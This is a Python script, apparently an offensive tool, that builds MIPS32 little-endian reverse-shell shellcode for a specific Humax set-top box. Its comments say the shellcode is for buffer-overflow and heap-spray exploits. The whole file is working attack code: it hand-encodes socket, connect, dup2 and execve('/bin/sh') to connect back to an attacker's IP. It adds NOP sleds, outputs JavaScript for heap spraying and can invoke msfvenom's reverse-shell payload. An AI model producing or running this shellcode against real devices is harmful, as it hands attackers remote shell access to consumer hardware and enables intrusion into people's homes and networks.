#!/usr/bin/env python3
"""
MIPS32 LE shellcode generator for Humax STB (BCM7213, Linux 2.6.18).

Генерирует reverse shell shellcode для buffer overflow / heap spray эксплойтов.
Платформа: MIPS32 little-endian, Linux o32 ABI, uClibc 0.9.29.
Нет ASLR, нет stack canaries, возможен executable stack.

Usage:
    python3 shellcode.py --ip 192.168.1.100 --port 4444
    python3 shellcode.py --ip 192.168.1.100 --port 4444 --format c
    python3 shellcode.py --ip 192.168.1.100 --port 4444 --format js
    python3 shellcode.py --msfvenom    # использовать msfvenom вместо встроенного
"""

import argparse
import struct
import subprocess
import sys


def mips_instruction(opcode_bits):
    """Pack 32-bit MIPS instruction as little-endian bytes."""
    return struct.pack("<I", opcode_bits)


def li_mips(reg, value):
    """Load 32-bit immediate into register (lui + ori). May contain nulls."""
    hi = (value >> 16) & 0xFFFF
    lo = value & 0xFFFF
    insns = b""
    # lui $reg, hi
    insns += struct.pack("<I", (0x0F << 26) | (reg << 16) | hi)
    # ori $reg, $reg, lo
    insns += struct.pack("<I", (0x0D << 26) | (reg << 21) | (reg << 16) | lo)
    return insns


def generate_shellcode(ip, port):
    """
    MIPS32 LE reverse shell shellcode.
    Connects back to ip:port, dup2 stdin/stdout/stderr, execve /bin/sh.

    Syscall numbers (Linux MIPS o32):
      socket  = 4183
      connect = 4170
      dup2    = 4063
      execve  = 4011

    Register convention:
      $v0 = syscall number / return value
      $a0-$a3 = arguments
      $s0 = saved socket fd
      $sp = stack pointer
    """
    ip_parts = [int(x) for x in ip.split(".")]
    ip_int = (ip_parts[0] << 24) | (ip_parts[1] << 16) | (ip_parts[2] << 8) | ip_parts[3]
    port_int = port

    sc = b""

    # --- socket(AF_INET=2, SOCK_STREAM=1, 0) ---
    # li $v0, 4183 (SYS_socket)
    sc += li_mips(2, 4183)
    # li $a0, 2 (AF_INET)
    sc += li_mips(4, 2)
    # li $a1, 1 (SOCK_STREAM)
    sc += li_mips(5, 1)
    # xor $a2, $a2, $a2 (protocol=0)
    sc += struct.pack("<I", (0x00 << 26) | (6 << 21) | (6 << 16) | (6 << 11) | 0x26)
    # syscall
    sc += struct.pack("<I", 0x0000000C)

    # move $s0, $v0 (save fd)  — or $s0, $v0, $zero
    sc += struct.pack("<I", (0x00 << 26) | (2 << 21) | (0 << 16) | (16 << 11) | 0x25)

    # --- Build sockaddr_in on stack ---
    # addiu $sp, $sp, -16
    sc += struct.pack("<I", (0x09 << 26) | (29 << 21) | (29 << 16) | ((-16) & 0xFFFF))

    # AF_INET=2, port (big-endian) → first 4 bytes of sockaddr_in
    sin_family_port = 0x0002 | (port_int << 16)  # AF_INET + port (already in network order position)
    # Actually sockaddr_in: sa_family(2) + sin_port(2, big-endian) + sin_addr(4, big-endian)
    # On little-endian MIPS, stored as:
    #   bytes 0-1: AF_INET = 0x0002 (LE: 02 00)
    #   bytes 2-3: port in network byte order
    #   bytes 4-7: IP in network byte order
    port_be = ((port_int >> 8) & 0xFF) | ((port_int & 0xFF) << 8)
    word0 = 2 | (port_be << 16)  # sa_family=2, sin_port

    # li $t0, word0
    sc += li_mips(8, word0)
    # sw $t0, 0($sp)
    sc += struct.pack("<I", (0x2B << 26) | (29 << 21) | (8 << 16) | 0)

    # li $t0, ip (network byte order packed into 32-bit LE word)
    # IP bytes need to be in network order: ip_parts[0].ip_parts[1].ip_parts[2].ip_parts[3]
    # On LE MIPS, a 32-bit store of value X puts X[7:0] at addr+0, X[15:8] at addr+1, etc.
    # We want addr+0=ip[0], addr+1=ip[1], addr+2=ip[2], addr+3=ip[3]
    # So the 32-bit value is: ip[3]<<24 | ip[2]<<16 | ip[1]<<8 | ip[0]
    ip_word = ip_parts[3] << 24 | ip_parts[2] << 16 | ip_parts[1] << 8 | ip_parts[0]
    sc += li_mips(8, ip_word)
    # sw $t0, 4($sp)
    sc += struct.pack("<I", (0x2B << 26) | (29 << 21) | (8 << 16) | 4)

    # Zero out sin_zero (8 bytes at offset 8)
    sc += struct.pack("<I", (0x00 << 26) | (8 << 21) | (8 << 16) | (8 << 11) | 0x26)  # xor $t0,$t0,$t0
    sc += struct.pack("<I", (0x2B << 26) | (29 << 21) | (8 << 16) | 8)   # sw $t0, 8($sp)
    sc += struct.pack("<I", (0x2B << 26) | (29 << 21) | (8 << 16) | 12)  # sw $t0, 12($sp)

    # --- connect($s0, $sp, 16) ---
    sc += li_mips(2, 4170)  # SYS_connect
    # move $a0, $s0
    sc += struct.pack("<I", (0x00 << 26) | (16 << 21) | (0 << 16) | (4 << 11) | 0x25)
    # move $a1, $sp
    sc += struct.pack("<I", (0x00 << 26) | (29 << 21) | (0 << 16) | (5 << 11) | 0x25)
    # li $a2, 16
    sc += li_mips(6, 16)
    # syscall
    sc += struct.pack("<I", 0x0000000C)

    # --- dup2($s0, 0), dup2($s0, 1), dup2($s0, 2) ---
    for fd in (0, 1, 2):
        sc += li_mips(2, 4063)  # SYS_dup2
        sc += struct.pack("<I", (0x00 << 26) | (16 << 21) | (0 << 16) | (4 << 11) | 0x25)  # move $a0, $s0
        sc += li_mips(5, fd)  # li $a1, fd
        sc += struct.pack("<I", 0x0000000C)  # syscall

    # --- execve("/bin/sh", NULL, NULL) ---
    # Put "/bin/sh\0" on stack
    # "/bin" = 0x2f62696e → LE word = 0x6e69622f
    # "/sh\0" = 0x2f736800 → LE word = 0x0068732f
    sc += li_mips(8, 0x6E69622F)  # "/bin"
    sc += struct.pack("<I", (0x2B << 26) | (29 << 21) | (8 << 16) | ((-8) & 0xFFFF))  # sw $t0, -8($sp) [relative to current sp which is already -16 from original]

    sc += li_mips(8, 0x0068732F)  # "/sh\0"
    sc += struct.pack("<I", (0x2B << 26) | (29 << 21) | (8 << 16) | ((-4) & 0xFFFF))  # sw $t0, -4($sp)

    sc += li_mips(2, 4011)  # SYS_execve
    # addiu $a0, $sp, -8  (pointer to "/bin/sh")
    sc += struct.pack("<I", (0x09 << 26) | (29 << 21) | (4 << 16) | ((-8) & 0xFFFF))
    # xor $a1, $a1, $a1 (argv=NULL)
    sc += struct.pack("<I", (0x00 << 26) | (5 << 21) | (5 << 16) | (5 << 11) | 0x26)
    # xor $a2, $a2, $a2 (envp=NULL)
    sc += struct.pack("<I", (0x00 << 26) | (6 << 21) | (6 << 16) | (6 << 11) | 0x26)
    # syscall
    sc += struct.pack("<I", 0x0000000C)

    return sc


def generate_nop_sled(count):
    """MIPS NOP sled: sll $zero, $zero, 0 = 0x00000000."""
    return b"\x00\x00\x00\x00" * count


def format_c(shellcode):
    """Format as C array."""
    lines = []
    for i in range(0, len(shellcode), 16):
        chunk = shellcode[i : i + 16]
        hex_bytes = ", ".join(f"0x{b:02x}" for b in chunk)
        lines.append(f"  {hex_bytes},")
    return "unsigned char shellcode[] = {\n" + "\n".join(lines) + "\n};"


def format_python(shellcode):
    """Format as Python bytes."""
    lines = []
    for i in range(0, len(shellcode), 16):
        chunk = shellcode[i : i + 16]
        hex_bytes = "".join(f"\\x{b:02x}" for b in chunk)
        lines.append(f'    b"{hex_bytes}"')
    return "shellcode = (\n" + "\n".join(lines) + "\n)"


def format_js(shellcode):
    """Format as JavaScript unescape() for heap spray."""
    parts = []
    for i in range(0, len(shellcode), 2):
        if i + 1 < len(shellcode):
            # Little-endian: low byte first
            parts.append(f"%u{shellcode[i+1]:02x}{shellcode[i]:02x}")
        else:
            parts.append(f"%u00{shellcode[i]:02x}")
    return 'var shellcode = unescape("' + "".join(parts) + '");'


def format_hex(shellcode):
    """Raw hex dump."""
    return shellcode.hex()


def use_msfvenom(ip, port):
    """Generate shellcode with msfvenom."""
    cmd = [
        "msfvenom",
        "-p", "linux/mipsle/shell_reverse_tcp",
        f"LHOST={ip}",
        f"LPORT={port}",
        "-f", "raw",
        "-o", "/dev/stdout",
    ]
    print(f"[*] Running: {' '.join(cmd)}", file=sys.stderr)
    result = subprocess.run(cmd, capture_output=True)
    if result.returncode != 0:
        print(f"[!] msfvenom error: {result.stderr.decode()}", file=sys.stderr)
        sys.exit(1)
    return result.stdout


def main():
    parser = argparse.ArgumentParser(description="MIPS32 LE shellcode generator")
    parser.add_argument("--ip", required=True, help="Attacker IP")
    parser.add_argument("--port", type=int, default=4444, help="Attacker port")
    parser.add_argument(
        "--format", "-f",
        choices=["raw", "hex", "c", "python", "js"],
        default="python",
        help="Output format",
    )
    parser.add_argument("--nop-sled", type=int, default=0, help="NOP sled size (instructions)")
    parser.add_argument("--msfvenom", action="store_true", help="Use msfvenom instead of built-in")
    parser.add_argument("-o", "--output", help="Output file (default: stdout)")
    args = parser.parse_args()

    if args.msfvenom:
        sc = use_msfvenom(args.ip, args.port)
    else:
        sc = generate_shellcode(args.ip, args.port)

    if args.nop_sled > 0:
        sc = generate_nop_sled(args.nop_sled) + sc

    null_count = sc.count(b"\x00")
    print(f"[*] Shellcode: {len(sc)} bytes, {null_count} null bytes", file=sys.stderr)
    if null_count > 0:
        print(
            f"[!] ВНИМАНИЕ: {null_count} null bytes. Для strcpy-based overflow "
            f"нужен null-free вариант (--msfvenom или ручная оптимизация).",
            file=sys.stderr,
        )
    print(f"[*] Target: {args.ip}:{args.port}", file=sys.stderr)

    formatters = {
        "raw": lambda s: s,
        "hex": format_hex,
        "c": format_c,
        "python": format_python,
        "js": format_js,
    }
    output = formatters[args.format](sc)

    if args.output:
        mode = "wb" if args.format == "raw" else "w"
        with open(args.output, mode) as f:
            f.write(output)
        print(f"[*] Saved to {args.output}", file=sys.stderr)
    else:
        if isinstance(output, bytes):
            sys.stdout.buffer.write(output)
        else:
            print(output)


if __name__ == "__main__":
    main()
